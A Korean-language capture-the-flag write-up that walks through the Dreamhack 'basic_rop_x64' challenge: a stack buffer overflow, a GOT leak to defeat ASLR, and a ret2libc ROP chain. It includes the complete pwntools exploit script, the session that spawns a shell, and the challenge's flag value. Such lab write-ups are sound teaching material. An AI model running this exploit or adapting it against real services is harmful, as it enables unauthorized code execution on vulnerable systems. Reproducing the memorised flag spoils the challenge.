https://teberr.notion.site/basic_rop_x64-04adc0acc4cc41deb9b7e24c4174c0fe

# 문제파일 다운로드

![문제파일 다운로드.PNG](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/bb07846d-1a03-4338-b421-fdaa6807de12/%EB%AC%B8%EC%A0%9C%ED%8C%8C%EC%9D%BC_%EB%8B%A4%EC%9A%B4%EB%A1%9C%EB%93%9C.png)

문제파일을 다운로드 받으면 basic_rop_x64.c 소스코드 파일과 basic_rop_x64파일 및 라이브러리를 획득할 수 있다. 소스코드를 확인해 보자.

```c
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>

void alarm_handler() {
    puts("TIME OUT");
    exit(-1);
}

void initialize() {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);

    signal(SIGALRM, alarm_handler);
    alarm(30);
}

int main(int argc, char *argv[]) {
    char buf[0x40] = {};

    initialize();

    read(0, buf, 0x400);
    write(1, buf, sizeof(buf));

    return 0;
}
```

main함수에서 사용한 배열 buf의 크기는 0x40이지만 사용자로 부터 입력을 받는 read함수를 보면 buf의 크기보다 큰 0x400만큼 입력을 받아 버퍼 오버플로우가 발생한다.

write 함수는 fd가 1이면 표준 출력으로 화면에 출력을 해주는 함수이다.

# 문제 접근

먼저 적용된 보호기법을 살펴보면 다음과 같다.

```solidity
gdb-peda$ checksec
CANARY    : disabled
FORTIFY   : disabled
NX        : ENABLED
PIE       : disabled
RELRO     : Partial
```

카나리가 존재하지 않고 NX비트가 적용되어 스택에서 실행권한이 없는 것을 확인할 수 있다. RELRO는 부분적으로 적용되어있다.

main을 gdb로 뜯어보면 아래와 같다.

```python
Dump of assembler code for function main:
   0x00000000004007ba <+0>:     push   rbp
   0x00000000004007bb <+1>:     mov    rbp,rsp
   0x00000000004007be <+4>:     sub    rsp,0x50
   0x00000000004007c2 <+8>:     mov    DWORD PTR [rbp-0x44],edi
   0x00000000004007c5 <+11>:    mov    QWORD PTR [rbp-0x50],rsi
   0x00000000004007c9 <+15>:    lea    rdx,[rbp-0x40]
   0x00000000004007cd <+19>:    mov    eax,0x0
   0x00000000004007d2 <+24>:    mov    ecx,0x8
   0x00000000004007d7 <+29>:    mov    rdi,rdx
   0x00000000004007da <+32>:    rep stos QWORD PTR es:[rdi],rax
   0x00000000004007dd <+35>:    mov    eax,0x0
   0x00000000004007e2 <+40>:    call   0x40075e <initialize>
   0x00000000004007e7 <+45>:    lea    rax,[rbp-0x40]
   0x00000000004007eb <+49>:    mov    edx,0x400
   0x00000000004007f0 <+54>:    mov    rsi,rax
   0x00000000004007f3 <+57>:    mov    edi,0x0
   0x00000000004007f8 <+62>:    call   0x4005f0 <read@plt>
   0x00000000004007fd <+67>:    lea    rax,[rbp-0x40]
   0x0000000000400801 <+71>:    mov    edx,0x40
   0x0000000000400806 <+76>:    mov    rsi,rax
   0x0000000000400809 <+79>:    mov    edi,0x1
   0x000000000040080e <+84>:    call   0x4005d0 <write@plt>
   0x0000000000400813 <+89>:    mov    eax,0x0
   0x0000000000400818 <+94>:    leave  
   0x0000000000400819 <+95>:    ret
```

스택 프레임 오프닝에서 0x50만큼 공간을 확보하지만 read@plt 함수를 통해서 사용자로 부터 입력을 받을 때는 위치가 [rbp-0x40]이므로 이 위치부터 사용자 입력이 들어간다고 생각하면 된다. 

```python
[-------------------------------------code-------------------------------------]
   0x4007eb <main+49>:  mov    edx,0x400
   0x4007f0 <main+54>:  mov    rsi,rax
   0x4007f3 <main+57>:  mov    edi,0x0
=> 0x4007f8 <main+62>:  call   0x4005f0 <read@plt>
   0x4007fd <main+67>:  lea    rax,[rbp-0x40]
   0x400801 <main+71>:  mov    edx,0x40
   0x400806 <main+76>:  mov    rsi,rax
   0x400809 <main+79>:  mov    edi,0x1
Guessed arguments:
arg[0]: 0x0 
arg[1]: 0x7fffffffe3a0 --> 0x0 
arg[2]: 0x400
-------------------------------------------------------------
gdb-peda$ x/64x $rsi
0x7fffffffe3a0: 0x0000000000000000      0x0000000000000000
0x7fffffffe3b0: 0x0000000000000000      0x0000000000000000
0x7fffffffe3c0: 0x0000000000000000      0x0000000000000000
0x7fffffffe3d0: 0x0000000000000000      0x0000000000000000
0x7fffffffe3e0: 0x0000000000000000      0x00007ffff7dfd81d
```

즉 버퍼 오버플로우의 기본 골자는 b’A’*0x40(버퍼) + b’B’*0x8(SFP)+덮어쓸 함수의 주소 가 된다.

이제 어떠한 방식으로 쉘을 획득할지 생각해야 한다.

이번 문제에서는 libc.so.6 라이브러리를 사용하기 때문에 이미 사용하고 있는 read함수의 got와libc.so.6에서의 read함수 오프셋을 이용해서 libc.so.6의 베이스 주소를 구한 후 system 함수의 오프셋을 더해 system함수의 주소를 알아내어 호출하고자 한다. 

이것이 가능한 이유는 라이브러리에서 각 함수의 오프셋이 정해져있기 때문이다. 

함수의 got주소는 ELF(파일명).got 를 이용하여 그 파일에서 got의 주소를 구할 수 있고

라이브러리 오프셋은 ELF(라이브러리명).symbols 를 이용하여 구할 수 있다. 

이 때 문제파일에서 다운로드 하면 받아지는 라이브러리는 libc.so.6으로 이를 기준으로 진행하면 된다.

즉 system 함수가 rop 파일이 실행되었을 때 라이브러리 상 어디 주소에 있는지 알기 위해서는 다음과 같은 과정을 거쳐야 한다.

1. read 함수(이미 불러졌던 함수)의 got 주소로 찾아가 got에 적혀있는 주소를 알아낸다. (라이브러리에 있는 read함수의 주소)
2. 그러면 라이브러리에 있는 read 함수의 주소를 알아냈으므로 이 값에서 라이브러리 read 함수 오프셋을 빼주면 라이브러리의 베이스 주소가 나온다.
3. 이 라이브러리 베이스 주소에서 라이브러리 system 오프셋을 더하면 system 함수의 라이브러리상 주소를 알 수 있다.

이를 위해서 write 함수를 이용해 read함수의 got에 적혀있는 주소를 알아내고자 했다. ASLR이 적용되어 있어도 PIE가 적용되어 있지 않은 한 plt 값은 고정이다.

```python
gdb-peda$ elfsymbol
Found 9 symbols
puts@plt = 0x4005c0
write@plt = 0x4005d0
alarm@plt = 0x4005e0
read@plt = 0x4005f0
__libc_start_main@plt = 0x400600
signal@plt = 0x400610
setvbuf@plt = 0x400620
exit@plt = 0x400630
__gmon_start__@plt = 0x400640
```

write 함수를 통해서 buf에 저장되어 있는 값을 화면에 출력해줄 수 있다. 따라서 버퍼 오버플로우를 통해 write 함수를 실행시켜 read함수의 got에 저장된 값을 알아낸다면 이를 바탕으로 시스템 함수의 주소를 알아낼 수 있다. 

write(1, read_got, 8이상) 을 실행시켜야 한다. 매개변수가 세개이므로 64비트 환경의 매개변수를 보면

![호출규약.PNG](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/22c66913-e6a3-40a5-bce6-83a59d944de4/%ED%98%B8%EC%B6%9C%EA%B7%9C%EC%95%BD.png)

첫 매개변수는 rdi 레지스터, 두번째 매개변수는 rsi, 세번째 매개변수는 rdx 에 저장이 되므로 이 레지스터를 이용할 가젯을 찾아야 한다.

![가젯.PNG](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/5854d78e-e6d7-4da7-bb50-e06073ac0d01/%EA%B0%80%EC%A0%AF.png)

```python
┌──(root💀kali)-[~/바탕화면/basic_rop_64]
└─# ROPgadget --binary ./basic_rop_x64| grep "pop rdi"
0x0000000000400883 : pop rdi ; ret
                                                                                             
┌──(root💀kali)-[~/바탕화면/basic_rop_64]
└─# ROPgadget --binary ./basic_rop_x64| grep "pop rdx"
                                                                                             
┌──(root💀kali)-[~/바탕화면/basic_rop_64]
└─# ROPgadget --binary ./basic_rop_x64| grep "pop rsi"                                   1 ⨯
0x0000000000400881 : pop rsi ; pop r15 ; ret
```

ROPgadget을 이용하여 가젯을 찾은 결과 rdx를 제외하고는 사용할 수 있는 가젯을 전부 찾아냈다. 근데 rdx의 경우 size의 위치인데 이 size 값을 지정하지 않아도 호출했을 때 문제가 되지 않나요?에 대한 답은 내 페이로드가 실행될 때는 write(1,buf,sizeof(buf))가 실행 된 직후 이므로 rdx가 0x40으로 지정되어 있다. 따라서 이 문제에서는 rdx뿐 아니라 사실 rdi값도 지정해주지 않아도 되긴한다. 

그러면 코드는 다음과 같은 과정으로 진행된다.

1. puts 함수의 plt, read함수의 plt및 got 주소를 알아낸다.
2. 버퍼오버플로우 발생을 통해 리턴할 함수 주소에 pop rdi,pop rsi ,write@plt 를 넣는다.
3. 이를 통해서 read_got에 써져있는 주소 값(라이브러리에서 read함수의 주소)을 알아낸다.
4. 라이브러리에서의 read 함수의 주소를 이용해 오프셋을 빼서 라이브러리의 베이스 주소를 알아낸다.
5. system 함수의 오프셋을 더해 system 함수를 호출하기 위한 주소를 얻어낸다.

```python
rom pwn import *

host="host3.dreamhack.games"
port=17771
p=remote(host,port)
#p=process('./basic_rop_x64')

e=ELF('./basic_rop_x64') # 파일 불러오기
library = ELF('./libc.so.6') # 라이브러리 불러오기
#library = e.libc # 로컬 파일의 라이브러리

# read 함수의 got에 적혀있는 read함수의 라이브러리 주소를 통해
# system 함수의 라이브러리 주소를 알아낼 것 이므로 read의 got주소를 알아야함
write_plt = e.plt['write'] # write 함수의 plt 주소 0x4005d0
read_plt = e.plt['read'] # read 함수의 plt 주소 0x4005f0
read_got = e.got['read'] # read 함수의 got 주소

pop_rdi = 0x0000000000400883
pop_rsi_r15 = 0x0000000000400881

# read 함수의 got 주소에는 read함수의 라이브러리에서의 주소가 나와있으므로 이를 알기 위함임
payload=b'A'*0x40+b'B'*0x8 # buf(0x40) + SFP

# write(1,read_got,rdx)
payload += p64(pop_rdi) + p64(1)
payload += p64(pop_rsi_r15)+p64(read_got)+p64(0)
payload += p64(write_plt)

p.send(payload)
p.recvuntil(b'A'*0x40) 

read_library = u64(p.recvn(6)+b'\x00'*2) # 출력된 read의 라이브러리상 주소 저장
library_base = read_library-library.symbols['read']
system_library = library_base + library.symbols['system']

```

이 때 read_library의 주소를 받아올 때 6바이트만 받아오고 나머지는 \x00으로 채우는 이유는 64비트에서 바이너리의 libc 주소는 우분투 환경에서 주로 0x7f로 시작되며 나머지는 0x00으로 채워지기 때문이다. 

```python
[DEBUG] Received 0x7 bytes:
    00000000  50 63 03 06  0a 7f 0a                               │Pc··│···│
    00000007
```

위와 같은 경우 맨 마지막에 붙은 0a는 puts로 출력할 때 붙는 개행 문자이므로  앞의 6바이트가 read의 라이브러리상 주소이다. 즉 위와 같은 경우 0x7f0a06036350이 된다.

그러면 이제 시스템함수 주소도 알아냈고 매개변수로 줄 “/bin/sh”의 위치만 알아내면 된다. 이는 라이브러리에서 오프셋을 알아낼 수 있다.

```solidity
┌──(root💀kali)-[~/바탕화면/basic_rop_64]
└─# strings -tx libc.so.6 | grep "/bin/sh"
 18cd57 /bin/sh
```

libc.so.6에서의 오프셋은 0x18cd57임을 확인할 수 있다. 라이브러리 base 주소를 알기 때문에 이 /bin/sh의 주소도 알 수 있다.

따라서 이를 이용하여 system(”/bin/sh”)를 실행시킬 것이다. 

### system(”/bin/sh”)를 실행시키려면 라이브러리 상의 system 주소를 알고난 후에 실행해야 하는데 페이로드 하나로 어떻게 짜요?

이게 가장 문제다. 기존 문제에서는 이를 해결하기 위해서 가젯 이후 가젯을 연결하여 체인을 통해서 실행시켰지만 read_got 덮어씌우는 것도 정상적으로 성공하고 system 함수 주소도 정확하게 구했는데도 system(”/bin/sh”)가 잘 안되었다.

그래서 라이브러리 base 주소를 구한 후 main 함수의 시작점으로 다시 돌아가는 방식을 채택했다. 즉 익스코드에서 write(1,read_got,rdx) 가젯을 통한 실행 후 main의 위치로 돌아가게 해준다.

```python
# write(1,read_got,rdx)
payload += p64(pop_rdi) + p64(1)
payload += p64(pop_rsi_r15)+p64(read_got)+p64(0)
payload += p64(write_plt)
payload += p64(e.symbols['main'])
```

그러면 다시 main 함수로 시작되므로 system(”/bin/sh”)를 가젯을 통해 실행시키면 끝이다. system주소도 알고 “/bin/sh”의 주소도 오프셋을 통해 구할 수 있으므로 가능하다. 

### system(”/bin/sh”)

```python
# system 주소와 /bin/sh 문자열의 주소를 구한 후 페이로드 작성

bin_sh_offset= 0x18cd57
bin_sh= library_base+bin_sh_offset
system_library = library_base + library.symbols['system']

payload2=b'A'*0x40+b'B'*0x8
payload2+=p64(pop_rdi)+p64(bin_sh)
payload2+=p64(system_library) 
```

즉 최종적인 익스코드는 다음과 같다.

```python
from pwn import *

host="host3.dreamhack.games"
port=17771
p=remote(host,port)
#p=process('./basic_rop_x64')

e=ELF('./basic_rop_x64') # 파일 불러오기
library = ELF('./libc.so.6') # 라이브러리 불러오기
#library = e.libc

# read 함수의 got에 적혀있는 read함수의 라이브러리 주소를
# system 함수의 라이브러리 주소를 덮어 씌울 것이므로 read의 got주소를 알아야함
write_plt = e.plt['write'] # write 함수의 plt 주소 0x4005d0
read_plt = e.plt['read'] # read 함수의 plt 주소 0x4005f0
read_got = e.got['read'] # read 함수의 got 주소
print(hex(read_got))
pop_rdi = 0x0000000000400883
pop_rsi_r15 = 0x0000000000400881

# read 함수의 got 주소에는 read함수의 라이브러리에서의 주소가 나와있으므로 이를 알기 위함임
payload=b'A'*0x40+b'B'*0x8 # buf(0x40) + SFP

# write(1,read_got,rdx)
payload += p64(pop_rdi) + p64(1)
payload += p64(pop_rsi_r15)+p64(read_got)+p64(0)
payload += p64(write_plt)
payload += p64(e.symbols['main'])

p.send(payload)
p.recvuntil(b'A'*0x40)

read_library = u64(p.recvn(6)+b'\x00'*2) # 출력된 read의 라이브러리상 주소 저장
library_base = read_library-library.symbols['read']

bin_sh_offset= 0x18cd57 
bin_sh= library_base+bin_sh_offset
system_library = library_base + library.symbols['system']

payload2 = b'A'*0x40+b'B'*0x8 # buf(0x40) + SFP
payload2 += p64(pop_rdi) + p64(bin_sh)
payload2 += p64(system_library)

p.send(payload2)
p.interactive()
```

이 익스코드를 실행시키고나면 쉘을 얻을 수 있다.

```python
──(root💀kali)-[~/바탕화면/basic_rop_64]
└─# python3 ./answer.py
[+] Opening connection to host3.dreamhack.games on port 17771: Done
[*] '/root/바탕화면/basic_rop_64/basic_rop_x64'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[*] '/root/바탕화면/basic_rop_64/libc.so.6'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
0x601030
[*] Switching to interactive mode
\x00@\xd7\x93\xa3\x7f\x00\xc0#\x17\xa3\x7f\x00p\xce▒\x93\xa3\x7f\x006\x06\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA$ ls
basic_rop_x64
flag
$ cat flag
DH{357ad9f7c0c54cf85b49dd6b7765fe54}[*] Got EOF while reading in interactive
$ 
[*] Interrupted
[*] Closed connection to host3.dreamhack.games port 17771
```

ls로 flag가 있음을 확인하고 cat을 통해 flag를 획득하였다.
